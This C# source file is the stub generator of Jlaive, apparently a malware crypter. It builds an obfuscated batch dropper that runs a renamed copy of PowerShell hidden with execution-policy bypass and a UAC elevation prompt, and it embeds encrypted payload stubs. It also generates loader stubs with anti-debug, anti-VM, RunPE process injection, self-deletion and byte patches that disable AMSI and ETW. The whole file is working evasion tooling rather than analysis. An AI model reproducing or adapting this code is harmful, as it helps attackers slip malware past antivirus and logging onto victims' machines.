using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using BatCloak;

using static Jlaive.Utils;

namespace Jlaive
{
    internal class StubGen
    {
        public byte[] Key { get; }
        public byte[] IV { get; }
        private Random rng { get; }
        private RandomString rngstr { get; }

        public StubGen(byte[] key, byte[] iv)
        {
            Key = key;
            IV = iv;
            rng = new Random();
            rngstr = new RandomString(rng);
        }

        public string CreateBat(string pscommand, byte[] stub, byte[] stub2, bool hidden, bool runas)
        {
            StringBuilder builder = new StringBuilder();
            if (runas)
            {
                builder.AppendLine(
                    "net file" +
                    Environment.NewLine +
                    "if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )" +
                    Environment.NewLine +
                    "cd \"%~dp0\""
                );
            }
            builder.AppendLine(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ""%~0.exe""");
            builder.AppendLine("cls");
            builder.AppendLine("cd \"%~dp0\"");
            builder.AppendLine($"\"%~0.exe\" -noprofile{(hidden ? " -w hidden" : string.Empty)} -ep bypass -c {pscommand}");
            builder.Append("exit /b");
            string obfuscated = new FileObfuscation().Process(builder.ToString(), 3);
            List<string> lines = new List<string>(obfuscated.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
            lines.Insert(rng.Next(0, lines.Count), $":: {Convert.ToBase64String(stub)}\\{Convert.ToBase64String(stub2)}");
            return string.Join(Environment.NewLine, lines);
        }

        public string CreatePS()
        {
            var replacements = new Dictionary<string, string> {
                { "FromBase64String", "('gnirtS46esaBmorF'[-1..-16] -join '')" },
                { "ReadAllText", "('txeTllAdaeR'[-1..-11] -join '')" },
                { "Load", "('daoL'[-1..-4] -join '')" },
                { "DECRYPTION_KEY", Convert.ToBase64String(Key) },
                { "DECRYPTION_IV", Convert.ToBase64String(IV) },
                { "contents_var", rngstr.Get(5) },
                { "lastline_var", rngstr.Get(5) },
                { "line_var", rngstr.Get(5) },
                { "payloads_var", rngstr.Get(5) },
                { "payload1_var", rngstr.Get(5) },
                { "payload2_var", rngstr.Get(5) },
                { "decrypt_function", rngstr.Get(5) },
                { "decompress_function", rngstr.Get(5) },
                { "execute_function", rngstr.Get(5) },
                { "param_var", rngstr.Get(5) },
                { "param2_var", rngstr.Get(5) },
                { "aes_var", rngstr.Get(5) },
                { "decryptor_var", rngstr.Get(5) },
                { "msi_var", rngstr.Get(5) },
                { "mso_var", rngstr.Get(5) },
                { "gs_var", rngstr.Get(5) },
                { "obfstep1_var", rngstr.Get(5) },
                { "obfstep2_var", rngstr.Get(5) },
                { Environment.NewLine, string.Empty }
            };
            return replacements.Aggregate(GetEmbeddedString("Jlaive.Resources.Stub.ps1"), (c, r) => c.Replace(r.Key, r.Value));
        }

        public string CreateCS(bool antidebug, bool antivm, bool meltfile, bool unhookapi, bool native)
        {
            StringBuilder builder = new StringBuilder();
            if (antidebug) builder.AppendLine("#define ANTI_DEBUG");
            if (antivm) builder.AppendLine("#define ANTI_VM");
            if (native) builder.AppendLine("#define USE_RUNPE");
            if (meltfile) builder.AppendLine("#define MELT_FILE");
            if (unhookapi) builder.AppendLine("#define UNHOOK_API");
            builder.AppendLine(GetEmbeddedString("Jlaive.Resources.Stub.cs"));
            return builder.ToString();
        }

        public string CreateBCS()
        {
            StringBuilder builder = new StringBuilder();
            var replacements = new Dictionary<string, string> {
                { "namespace_name", rngstr.Get(20) },
                { "class_name", rngstr.Get(20) },
                { "aesfunction_name", rngstr.Get(20) },
                { "virtualprotect_name", rngstr.Get(20) },
                { "amsiscanbuffer_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), Key, IV)) },
                { "etweventwrite_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("EtwEventWrite"), Key, IV)) },
                { "amsi64patch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, Key, IV)) },
                { "amsipatch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, Key, IV)) },
                { "etw64patch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xC3 }, Key, IV)) },
                { "etwpatch_str", Convert.ToBase64String(Encrypt(new byte[] { 0xC2, 0x14, 0x00 }, Key, IV)) },
                { "key_str", Convert.ToBase64String(Key) },
                { "iv_str", Convert.ToBase64String(IV) }
            };
            builder.AppendLine(replacements.Aggregate(GetEmbeddedString("Jlaive.Resources.BStub.cs"), (c, r) => c.Replace(r.Key, r.Value)));
            return builder.ToString();
        }
    }
}